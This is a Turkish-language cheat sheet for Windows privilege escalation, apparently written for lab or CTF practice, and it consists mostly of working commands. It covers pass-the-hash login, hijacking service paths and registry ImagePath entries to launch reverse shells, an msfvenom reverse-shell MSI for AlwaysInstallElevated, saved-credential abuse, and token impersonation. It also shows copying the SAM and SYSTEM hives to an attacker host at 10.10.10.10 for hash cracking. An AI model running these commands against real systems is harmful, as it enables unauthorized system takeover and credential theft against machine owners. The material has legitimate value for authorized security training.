#Windows Privilege Escalation
***


**Windows'a bağlanmak için komutlar:**

- ```xfreerdp /u:USER /p:PASWORD /cert:ignore /v:MACHINE_IP```
- ```rdesktop -u USER -p PASWORD MACHINE_IP```
- ```pth-winexe -U 'USER%hash' //MACHINE_IP cmd.exe``` (hash NT:LM şeklinde belirtilmelidir.)
- ```winexe -U 'USER%PASSWORD' //MACHINE_IP cmd.exe```
- ```python3 psexec.py DOMAIN/USER:PASWORD@MACHINE_IP```
***

**Dosya paylaşımı için komutlar:**
- ```python3 -m http.server``` ile dinlendikten sonra, hedef üzerinde ```wget IP_ADRESI:PORT/DOSYA_ADI``` ile veya powershell varsa ```powershelliwr -Uri IP_ADRESI:PORT/DOSYA_ADI -Outfile ÇIKTI_DOSYASI``` şeklinde kullanılabilir.
- SMB dosya paylaşım servisi ile birçok Windows sürümü için ```impacket-smbserver DIZIN .``` komutu kali linux üzerinde çalıştırıldıktan sonra, hedef windows üzerinde komut satırından ```copy \\KALI_IP\DIZIN\DOSYA_ADI``` komutları ile dosya alınabilir. Burada **DIZIN** sizin belirlediğiniz herhangi bir isim olabilir. **DIZIN** ifadesinden sonra "**.**" ile kali üzerinde o an bulunulan dizin servis edilmiş olur ve istenirse klasör adı belirtilerek değiştirilebilir.
- **Socat ile dosya paylaşımı:** 
  *Server sending file:*
server: ```socat -u FILE:test.dat TCP-LISTEN:9876,reuseaddr```
client: ```socat -u TCP:127.0.0.1:9876 OPEN:out.dat,creat```
*Server receiving file:*
server: ```socat -u TCP-LISTEN:9876,reuseaddr OPEN:out.txt,creat && cat out.txt```
client: ```socat -u FILE:test.txt TCP:127.0.0.1:9876```
***
##*1. Enumeration with WinPEAS*
Winpeas daha sonra anlatılacak olan bir çok yöntemi sömürmek için gerekli açıklıkları bulmaktadır. Ayrıca sistemde hardcoded kayıtlı parolalar ve zamanlanmış görevler gibi yetki yükseltmeye yarayabilecek bilgileri de sunar.

- ```winpeas.exe``` #run all checks (except for additional slower checks - LOLBAS and linpeas.sh in WSL) (noisy - CTFs)
- ```winpeas.exe systeminfo userinfo``` #Only systeminfo and userinfo checks executed
- ```winpeas.exe notcolor``` #Do not color the output
- ```winpeas.exe domain``` #enumerate also domain information
- ```winpeas.exe wait``` #wait for user input between tests
- ```winpeas.exe debug``` #display additional debug information
- ```winpeas.exe log``` #log output to out.txt instead of standard output
- ```winpeas.exe -linpeas=http://127.0.0.1/linpeas.sh``` #Execute also additional linpeas check (runs linpeas.sh in default WSL distribution) with custom linpeas.sh URL (if not provided, the default URL is: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh)
- ```winpeas.exe -lolbas```  #Execute also additional LOLBAS search check
***
##*2. Güvensiz Servis İzinleri*

Servislerin konfigürasyonlarını değiştirmeye izin verildiğinde ortaya çıkar ve servis başlangıç dosyaları değiştirilerek kullanılabilir. 

- ```accesschk.exe /accepteula -uwcqv USER SERVIS_ADI``` ile kullanıcının servis üzerindeki izinleri sorgulanır.
- ```sc qc SERVIS_ADI``` ile servisin hangi yetkilerle çalıştığı ve diğer bilgileri görüntülenir.
- ```sc config SERVIS_ADI binPath="C:\PrivEsc\reverse.exe"``` komutu ile reverse shell dosyasının komutu servis binary path'i olarak belirlenir ve ardından ```sc start SERVIS_ADI``` ile servis başlatılarak reverse shell alınabilir. 
Bu işlemler yapılırken servis ayarlarını değiştirmek ve başlatma gibi yetkilerin olunduğundan emin olunmalıdır.

##*3. Unquoted Service Path*
Bu açıklık servis dizinleri " " işaretleri arasında belirlenmemişse ortaya çıkmaktadır. ' ' veya " " işaretleri arasında yazılmayan servis dizinlerinde servis çalıştırılırlen her boşluktan sonra .exe konularak dosya aranmakta ve boşluk içeren dizinlerin bir üstüne yazma hakkımız varsa buraya doğru isimdeki reverse shell konularak yetki yükseltilebilir.

- **C:\Program Files\Unquoted Path Service\Common Files\servis.exe** dosyasında ```C:\Program Files\Unquoted Path Service``` klasörüne yazma hakkımız varsa Common.exe isimli bir reverse shell oluşturup servis haklarıyla çalışmasını sağlayabiliriz. Bu durumda ```net start SERVIS_ADI``` komutuyla servis yeniden başlatıldığında **Common.exe** isimli shell dosyamız çalışacaktır.
- Önce ```accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"``` komutuyla yazma izni kontrol edilir ve daha sonra ```copy reverse_shell.exe "C:\Program Files\Unquoted Path Service\Common.exe"``` komutu ile shell dosyası ilgili dizine koyulur.

##*4. Zayıf Registry İzinleri*

- ```sc qc regsvc``` komutu ile regsvc servisinin sistem haklarıyla çalıştığı görülür.
- ```accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc``` komutu ile izinler kontrol edilir. **NT AUTHORITY\INTERACTIVE** yazıyorsa **INTERACTIVE** ifadesi tüm giriş yapmış kullanıcıları kastetmektedir ve bu durumda da tüm kullanıcılar için izin var demektir.
- ```reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse_shell.exe /f``` komutu yardımıyla regsvc servisinin binary dosyasının yeri reverse_shell dosyasının yeri olarak belirlenir ve ```net start regsvc``` ile yeniden başlatıldığında reverse shell başlatılmış olur.

##*5. Güvensiz Servis Exe İzni*
- ```sc qc SERVIS_ADI``` ile servisin hakları kontrol edilir.
- ```accesschk.exe /accepteula -quvw "C:\Program Files\Service\SERVIS.exe"``` ile servis exe dosyasının yazılabilir olduğu doğrulanır.
- Daha sonra servis exe dosyası ```copy reverse.exe "C:\Program Files\Service\SERVIS.exe" /Y``` komutu yardımıyla reverse_shell.exe ile değiştirilir ve ```net start SERVIS_ADI``` ile yeniden başlatılır.

##*6. Otomatik Çalışan Programlar*

- ```reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run``` otomatik çalışan programlar kontrol edilir ve ```accesschk.exe /accepteula PROGRAM_PATH``` ile yazma iznimizin olduğu doğrulanır. Yazma iznimiz varsa ```copy``` komutuyla ilgili dosyanın üzerine reverse_shell yazılır ve hangi durumda çalışıyorsa, tetiklenmesi sağlanır.

##*7. Always Install Elevated*
Bu izin msi uzatılı yükleme dosyalarının daima yüksek izinlerle çalıştırılıp programları yüklemesi için verilir. ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi``` komutuyla üretilen reverse_shell msi dosyası uzak sistemde çalıştırıldığında system haklarıyla shell alınır.
- İlk önce aşağıdaki kayıt defteri girdilerinden bu iznin bulunduğu doğrulanır.
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

- Ardından oluşturulan msi uzantılı shell dosyası doğrudan ```.\reverse.msi``` veya ```msiexec /quiet /qn /i C:\PrivEsc\reverse.msi``` yazılarak komut satırından çalıştırılabilir.

##*8. Kayıtlı Parolalar*
Çeşitli sebeplerle sisteme kaydedilmiş parolalar aranıp bulunabilir.

- Registry'de kayıtlı parolalar için: ```reg query HKLM /f password /t REG_SZ /s```
- Bellekte kayıtlı parolalar varsa: ```cmdkey /list``` komutu ile görülebilir. Ardından ```runas /savecred /user:admin C:\PrivEsc\reverse.exe``` çalıştırılabilir. Reverse shell yerine CMD'de çalıştırılabilir.
- SAM ve SYSTEM dosyaları varsa ve okunabiliyorsa: ```copy C:\Windows\Repair\SAM \\10.10.10.10\kali\``` ve ```copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\``` komutlarıyla kali'ye gönderilir. Ardından kali üzerinde ```samdump2 SYSTEM SAM``` ile hash'ler elde edilir ve kırılmaya çalışılabilir.

##*9. Zamanlanmış Görevler*
Zamanlanmış görev tespit edildiyse ve dosyalar değiştirilebiliyorsa yetki yükseltmek için kullanılabilir.
Eğer dosyaya yazma iznimiz varsa ```echo .\reverse.exe >> C:\Programs\SCHEDULED_TASK.ps1``` komutu ile dosya içeriği değiştirilebilir. 

##*10. Güvensiz GUI Uygulamaları*
Bu uygulamalar belirli haklarla çalışıyorsa ve dosya çalıştırmak için girdi alıyorsa, cmd.exe veya powershell.exe dosyaları girdi olarak verilerek o kullanıcının haklarıyla çalıştırılabilir.

##*11. TokenImpersonation İzinleri ve Saldırıları*
Eğer objeler üzerinde SEImpersonation izinlerimiz varsa o kullanıcı haklarıyla belirli işlemler yapılabilir. **SeImpersonatePrivilege** veya **SeAssignPrimaryTokenPrivilege** gibi izinler bulunuyorsa bu işlem yapılabilir. ```whoami /priv``` komutuyla kullanıcı izinleri kontrol edilebilir. Daha sonra Impersonation izni PSExec gibi araçlarla sömürülebilir. 

- ```C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe``` komutuyla *C:\PrivEsc\reverse.exe* dosyası *"nt authority\local service"* kulanıcısı impersonate (taklit) edilerek çalıştırılabilmektedir. ***(Dosyaların tam yolunun verilmesi, sistem kullanıcısının dosyayı bulması için önemlidir.)***
- Burada yukarıdaki komutun çalışabilmesi ***SeImpersonatePrivilege*** veya ***SeAssignPrimaryTokenPrivilege*** gibi bir iznin kullanıcıya verilmiş olmasından kaynaklanmaktadır.